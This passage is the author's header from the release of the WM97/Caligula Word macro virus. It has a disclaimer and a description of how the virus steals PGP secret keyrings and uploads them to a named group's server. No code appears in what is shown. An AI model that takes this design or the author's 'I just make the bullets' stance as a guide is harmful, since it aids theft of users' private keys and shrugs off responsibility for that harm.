                        DISCLAIMER:
This code is for educational purposes only. I wrote this virus
to illustrate the weaknesses and flaws in security of Win9x, 
Office97, and PGP. The author (Opic), his group (CodeBreakers),
and their server hold NO, repeat NO responsibilty for others use
or misuse of this virus. ie: people that spread it, infected users,
etc, etc are ON THEIR OWN. I cannot and will not be help liable for
others decisions on what to do with my code. I just make the 
bullets, if someone shoots at someone else theres little i can
do about it. Consider yourself warned.  -Opic

"Virus Attacks:
Espionage enabled viruses.  Designed to collect/steal information.  
May be vertically targeted or horizontally deployed. 
There's a bright future for "espionage enabled" viruses.  Consider a 
virus that spreads only to machines that have a copy of PGP. 
Countermeasures:
Use virus checking software"

Virus Name: WM97/Caligula
Author: Opic [CodeBreakers]
Date: 1998
Info: Caligula is a Stealth WM97 SR1(2)-compatible virus.
      It is unique in the manner that it is one of the first 
      espionage enabled viruses (ie: steals information).
      Caligula steals PGP Secret Keyrings from infected users
      and uploads them onto the internet. More specifically
      it uploads them to: CodeBreakers.Org
      The virus spreads to users regardless of if they own PGP
      or not (joel doesnt know much about propagation techniques)      
      but it will only upload the infected users key once (to 
      avoid uploading multiple copies of the key. Caligula places
      a marker in the Windows registry to signal the PGP theft has
      been sucessful. on the 31st of the month caligula displays
      a messagebox which reads:

      "WM97/Caligula (c)Opic [CodeBreakers 1998]
      "No cia,"
      "No nsa,"         
      "No satellite,"
      "Could map our veins." 

      and the following properties are also given to infected 
      documents:
